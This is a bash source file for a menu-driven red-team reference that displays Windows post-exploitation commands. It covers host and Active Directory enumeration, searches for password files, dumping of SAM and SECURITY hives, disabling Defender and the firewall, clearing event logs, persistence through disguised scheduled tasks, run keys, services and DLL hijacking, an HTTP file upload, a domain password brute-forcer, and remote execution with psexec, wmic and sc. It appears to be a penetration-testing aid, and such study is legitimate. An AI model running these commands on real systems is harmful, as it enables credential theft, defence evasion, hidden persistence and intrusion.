#!/usr/bin/env bash
# modules/red/windows.sh

red_windows() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  🪟 RED — Windows  " \
            --menu "\n  Windows Enumeration & Exploitation:\n" 22 65 9 \
            "1" "  🔎  Situational Awareness" \
            "2" "  👤  User & Account Enum" \
            "3" "  🌐  Network Info & Config" \
            "4" "  🗂️   Data Mining & Files" \
            "5" "  🏛️   Active Directory Enum" \
            "6" "  ⚙️   Registry & Misc Config" \
            "7" "  💾  Persistence — User & System Level" \
            "8" "  📜  Scripting — PowerShell & Batch" \
            "9" "  🏃  Remote Execution" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_win_situ ;;
            2) _red_win_users ;;
            3) _red_win_net ;;
            4) _red_win_data ;;
            5) _red_win_ad ;;
            6) _red_win_reg ;;
            7) _red_win_persist ;;
            8) _red_win_script ;;
            9) _red_win_remote ;;
        esac
    done
}

_red_win_situ() { show_page "Windows — Situational Awareness" \
"═══════════════════════════════════════════════════════════════
  Windows — Situational Awareness                      [RED]
═══════════════════════════════════════════════════════════════

  OS INFORMATION
    ver
    systeminfo
    wmic qfe list                     Hotfixes
    wmic cpu get datawidth /format:list   32 or 64 bit
    dir /a c:\\                        x86 folder = 64bit

  PROCESS & SERVICE ENUMERATION
    tasklist /svc
    tasklist /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" \\
      /FI \"STATUS eq running\" /V
    wmic process get name,executablepath,processid
    wmic process where name=\"<PROC>\" call terminate
    sc query type= all state= all

  DETECT AV / SECURITY
    wmic /namespace:\\\\root\\SecurityCenter2 path \\
      AntiVirusProduct get displayName,productState
    Get-WmiObject -Namespace \"root\\SecurityCenter2\" \\
      -Class AntiVirusProduct

  SHARES & SESSIONS
    net share
    net session
    reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2

  INSTALLED SOFTWARE
    wmic product get name,version
    reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall

  SCREEN + LOCK STATUS
    query session
    query user"; }

_red_win_users() { show_page "Windows — User & Account Enum" \
"═══════════════════════════════════════════════════════════════
  Windows — User & Account Enum                        [RED]
═══════════════════════════════════════════════════════════════

  CURRENT USER
    echo %USERNAME%
    whoami /all
    whoami /priv

  USER DETAILS
    net user <USERNAME>
    net user <USERNAME> /domain
    wmic netlogin where (name like \"%<USER>%\") \\
      get Name,numberoflogons

  LOCAL ADMINS
    net localgroup \"Administrators\"

  ALL USERS
    net user
    wmic useraccount list full

  PASSWORD POLICY
    net accounts
    net accounts /domain

  USER LOGON HISTORY
    Get-EventLog Security 4768,4769,4771,4778,4779 \\
      -after ((get-date).addDays(-14)) | \\
      Select TimeGenerated,Message

  PRIVILEGE ESCALATION CHECK
    whoami /priv
    (Look for: SeImpersonatePrivilege, SeDebugPrivilege,
               SeTakeOwnershipPrivilege, SeBackupPrivilege)

  RUN AS ANOTHER USER
    runas /user:<DOMAIN>\\<USER> cmd.exe
    runas /user:<DOMAIN>\\<USER> /netonly cmd.exe"; }

_red_win_net() { show_page "Windows — Network Info & Configuration" \
"═══════════════════════════════════════════════════════════════
  Windows — Network Info & Configuration               [RED]
═══════════════════════════════════════════════════════════════

  INTERFACE INFO
    ipconfig /all
    ipconfig /displaydns          DNS cache

  CONNECTIONS + PORTS
    netstat -ano
    netstat -anop tcp 3 >> <FILE>     (every 3 sec)
    netstat -an | findstr LISTENING

  ROUTING TABLE
    route print
    arp -a

  DNS ZONE TRANSFER
    nslookup
    server <FQDN>
    set type=ANY
    ls -d <DOMAIN>
    exit

  SET STATIC IP
    netsh interface ip set address name=\"<IF>\" \\
      static <NEW_IP> <MASK> <GW>

  SET DNS
    netsh interface ip set dnsservers name=\"<IF>\" \\
      static <DNS_IP>

  SET DHCP
    netsh interface ip set address name=\"<IF>\" source=dhcp

  PORT FORWARD (admin required)
    netsh interface portproxy add v4tov4 \\
      listenport=3000 listenaddress=1.1.1.1 \\
      connectport=4000 connectaddress=2.2.2.2

    # Remove:
    netsh interface portproxy delete v4tov4 \\
      listenport=3000 listenaddress=1.1.1.1"; }

_red_win_data() { show_page "Windows — Data Mining & Files" \
"═══════════════════════════════════════════════════════════════
  Windows — Data Mining & Files                        [RED]
═══════════════════════════════════════════════════════════════

  FILE SEARCHING
    dir /a /s /b C:\\*pdf*
    findstr /SI password *.txt *.xml *.ini *.config
    type <FILE>
    find /I \"<STRING>\" <FILE>
    type <FILE> | find /c /v \"\"     (count lines)

  SEARCH FOR SENSITIVE FILES
    dir /s /b *pass* *cred* *secret* *config* *vnc*
    findstr /spin \"password\" *.txt *.xml *.ini *.config 2>nul
    findstr /spin \"connectionString\" *.xml 2>nul

  TREE FILE SYSTEM
    tree.com /F /A \\\\<IP>\\<PATH> > tree.log
    dir /s /a \\\\<IP>\\<PATH> > dir.log

  COMPRESS FILE
    makecab c:\\windows\\temp\\data.log c:\\windows\\temp\\data.zip
    expand c:\\data.zip c:\\data.log

  USING VOLUME SHADOW SERVICE (VSS)
    vssadmin list shadows
    wmic shadowcopy call create Volume=c:\\
    mklink /D C:\\restore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\

  COPY REMOTE FOLDER
    xcopy /s \\\\<IP>\\<SHARE> <LOCAL_DIR>

  INTERESTING LOCATIONS
    C:\\Users\\*\\AppData\\Roaming\\
    C:\\Users\\*\\Desktop\\
    C:\\Users\\*\\Documents\\
    C:\\inetpub\\wwwroot\\
    C:\\Windows\\System32\\config\\SAM
    C:\\Windows\\repair\\SAM
    %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"; }

_red_win_ad() { show_page "Windows — Active Directory Enum" \
"═══════════════════════════════════════════════════════════════
  Windows — Active Directory Enum                      [RED]
═══════════════════════════════════════════════════════════════

  NET.EXE ENUMERATION
    net localgroup administrators
    net localgroup administrators /domain
    net view /domain
    net user /domain
    net user <USER> /domain
    net accounts /domain
    net group \"Domain Admins\" /domain

  DSQUERY
    dsquery * -filter \"(&(objectclass=user)(admincount=1))\" -attr samaccountname name
    dsquery * -filter \"((objectclass=user))\" -attr name samaccountname > users.txt
    dsquery * -filter \"(objectclass=trusteddomain)\" -attr flatname trustdirection
    dsquery * -filter \"(operatingsystem=*server*)\" -attr name operatingsystem dnshostname
    dsquery computer -limit 0 > computers.txt

  ACTIVE DIRECTORY EXPLOITATION CHECKLIST
    [ ] Windows hashes are NOT salted → test password reuse
    [ ] Domain service accounts may have weak/old passwords
    [ ] Enterprise Admin can traverse forest domains
    [ ] Separation of privilege? Workstation admin ≠ Domain admin?
    [ ] Check for AS-REP roastable accounts (no pre-auth)
    [ ] Check for Kerberoastable SPNs

  POWERSHELL AD MODULE
    Get-ADUser -Filter *
    Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled
    Get-ADGroupMember \"Domain Admins\"
    Get-ADComputer -Filter * | Select Name,Enabled
    Get-ADDefaultDomainPasswordPolicy
    Get-ADGroup -Filter * | Select Name

  BLOODHOUND COLLECTION
    # SharpHound.exe --CollectionMethods All
    # Import ZIP to BloodHound
    # Find Shortest Path to Domain Admin"; }

_red_win_reg() { show_page "Windows — Registry & Misc Config" \
"═══════════════════════════════════════════════════════════════
  Windows — Registry & Misc Config                     [RED]
═══════════════════════════════════════════════════════════════

  SEARCH REGISTRY FOR PASSWORDS
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

  SAVE SECURITY HIVE (requires SYSTEM)
    reg save HKLM\\Security security.hive
    reg save HKLM\\SAM sam.hive
    reg save HKLM\\System system.hive

  IMPORTANT REGISTRY KEYS
    HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /v ProductName   OS name
    HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /v InstallDate   Install date
    HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation /v ActiveTimeBias
    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU   Run history
    HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs
    HKCU\\Software\\SimonTatham\\Putty\\Sessions                SSH saved creds
    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU

  MISC RECONFIG
    # Lock workstation
    rundll32 user32.dll,LockWorkStation

    # Disable firewall (test)
    netsh advfirewall set allprofiles state off

    # Re-enable CMD (if blocked)
    reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System \\
      /v DisableCMD /t REG_DWORD /d 0 /f

  DISABLE WINDOWS DEFENDER
    sc config WinDefend start= disabled
    sc stop WinDefend
    Set-MpPreference -DisableRealtimeMonitoring \\$true
    \"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All

  EVENT LOG MANIPULATION
    wevtutil cl Application /bu:<BACKUP>.evtx
    wevtutil qe Application /c:20 /rd:true /f:text
    Clear-EventLog -LogName Application,Security"; }

_red_win_persist() { show_page "Windows — Persistence Techniques" \
"═══════════════════════════════════════════════════════════════
  Windows — Persistence Techniques                     [RED]
═══════════════════════════════════════════════════════════════

  USER-LEVEL PERSISTENCE (no admin needed)
  ─────────────────────────────────────────
  SCHEDULED TASK (daily at 9AM)
    schtasks /Create /F /SC DAILY /ST 09:00 \\
      /TN OfficeUpdater /TR <FILE>
    schtasks /query /tn OfficeUpdater /fo list /v
    schtasks /delete /tn OfficeUpdater /f

  RUN KEY (executes on logon)
    reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\
      /V OfficeUpdater /t REG_SZ /F /D <FILE>

  STARTUP DIRECTORY (user)
    %SystemDrive%\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

  SYSTEM-LEVEL PERSISTENCE (admin required)
  ──────────────────────────────────────────
  SCHTASKS ON BOOT (runs as SYSTEM)
    schtasks /Create /F /RU system /SC ONLOGON \\
      /TN OfficeUpdater /TR <FILE>
    schtasks /run /tn OfficeUpdater
    schtasks /delete /tn OfficeUpdater /f

  SC.EXE SERVICE (runs as SYSTEM)
    sc create MySvc binPath= \"<FILE>\" start= auto
    sc start MySvc
    sc stop MySvc && sc delete MySvc

  RUN KEY HKLM
    reg ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\
      /V SysHelper /t REG_SZ /F /D <FILE>

  STARTUP DIRECTORY (all users)
    %SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

  DLL HIJACK (WptsExtensions — no reboot of svc needed)
    reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v PATH
    # Copy malicious.dll as WptsExtensions.dll to PATH dir
    # Reboot — schedule service loads it"; }

_red_win_script() { show_page "Windows — PowerShell & Batch Scripting" \
"═══════════════════════════════════════════════════════════════
  Windows — PowerShell & Batch Scripting               [RED]
═══════════════════════════════════════════════════════════════

  POWERSHELL BASICS
    Stop-Transcript
    Get-Content <FILE>
    Get-Help <CMD> -Examples
    Get-Command *<STRING>*
    Get-Service
    Get-WmiObject -Class win32_service
    \$psVersionTable

  POWERSHELL ONELINERS
    # Execution bypass
    powershell -ep bypass -nop -File <FILE>

    # TCP port scanner
    \$ports=(80,443,8080); \$ip=\"<IP>\";
    foreach(\$p in \$ports){
      try{\$s=New-Object Net.Sockets.TCPClient(\$ip,\$p)}catch{};
      if(\$s){echo \"\$ip:\$p - Open\"}
    }

    # Ping with timeout
    \$ping = New-Object Net.NetworkInformation.Ping
    \$ping.Send(\"<IP>\", 500)

    # Download file
    powershell -noprofile -c \\
      'Invoke-WebRequest -Uri \"<URL>\" -OutFile <FILE>'

    # Upload file via HTTP POST
    \$http = New-Object Net.WebClient
    \$http.UploadFile(\"http://<URL>\", \"<FILE>\")

    # Export WMI to CSV
    Get-WmiObject -class win32_operatingsystem | \\
      select -property * | export-csv <FILE>

    # Send email
    Send-MailMessage -to \"<TO>\" -from \"<FROM>\" \\
      -subject \"<SUBJ>\" -a \"<ATTACH>\" \\
      -SmtpServer \"<IP>\" -Port \"<PORT>\"

  BATCH SCRIPTING
    # Nested ping sweep
    for /L %i in (10,1,254) do @(for /L %x in (10,1,254) do \\
      @ping -n 1 -w 100 10.10.%i.%x 2>nul | find \"Reply\" \\
      && echo 10.10.%i.%x >> live.txt)

    # Loop file lines
    for /F \"tokens=*\" %%A in (<FILE>) do echo %%A

    # Domain brute forcer
    for /F %%N in (users.txt) do for /F %%P in (passwords.txt) do \\
      net use \\\\<IP>\\IPC\$ /user:<DOMAIN>\\%%N %%P 1>NUL 2>&1 \\
      && echo %%N:%%P >> success.txt"; }

_red_win_remote() { show_page "Windows — Remote Execution" \
"═══════════════════════════════════════════════════════════════
  Windows — Remote Execution                           [RED]
═══════════════════════════════════════════════════════════════

  SC.EXE METHOD (modify service binpath)
    sc \\\\<IP> qc vss
    sc \\\\<IP> query vss
    sc \\\\<IP> config vss binpath= \"<FILE>\"
    sc \\\\<IP> qc vss
    sc \\\\<IP> start vss
    sc \\\\<IP> stop vss
    sc \\\\<IP> config vss binpath= \"<ORIGINAL_PATH>\"

  SCHTASKS METHOD
    schtasks /Create /F /RU system /SC ONLOGON \\
      /TN OfficeUpdater /TR <FILE> /s <IP>
    schtasks /query /tn OfficeUpdater /fo list /v /s <IP>
    schtasks /run /tn OfficeUpdater /s <IP>
    schtasks /delete /tn OfficeUpdater /f /s <IP>

  PSEXEC (Sysinternals)
    psexec \\\\<IP> -u <USER> -p <PASS> cmd.exe
    psexec \\\\<IP> -u <USER> -p <PASS> -s cmd.exe  (SYSTEM)

  WMIC
    wmic /node:<IP> /user:<DOMAIN>\\<USER> \\
      /password:<PASS> process call create \"<CMD>\"
    wmic /node:<IP> process list brief /every:1

  REMOTE REGISTRY
    reg add \\\\<IP>\\HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \\
      /V \"MyApp\" /t REG_SZ /F /D \"<FILE>\"

  REMOTE FILE OPS
    xcopy /s \\\\<IP>\\<SHARE> <LOCAL_DIR>
    dir \\\\<IP>\\c\$
    tasklist /v /s <IP>"; }
